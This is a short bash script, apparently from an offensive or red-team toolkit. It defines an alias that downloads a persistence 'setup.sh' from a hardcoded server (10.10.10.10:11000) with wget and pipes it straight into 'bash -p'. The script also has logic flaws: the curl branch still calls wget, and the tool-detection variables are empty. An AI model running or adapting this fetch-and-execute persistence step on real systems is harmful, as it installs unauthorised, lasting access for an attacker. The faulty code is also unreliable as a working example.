#!/bin/bash

FALSE=$(/bin/false)
SERVER_IP="10.10.10.10"
SERVER_HTTP_PORT="11000"

HAS_WGET=""
HAS_CURL=""

if [[ "$HAS_WGET" != "$FALSE" ]];
then
    peristence_service_setup="wget -qO- http://$SERVER_IP:$SERVER_HTTP_PORT/preload/scripts/persistence/custom/service/king/setup.sh | bash -p"
elif [[ "$HAS_CURL" != "$FALSE" ]];
then
    peristence_service_setup="wget -qO- http://$SERVER_IP:$SERVER_HTTP_PORT/preload/scripts/persistence/custom/service/king/setup.sh | bash -p"
fi

alias PERSISTENCE_SERVICE_SETUP="$peristence_service_setup"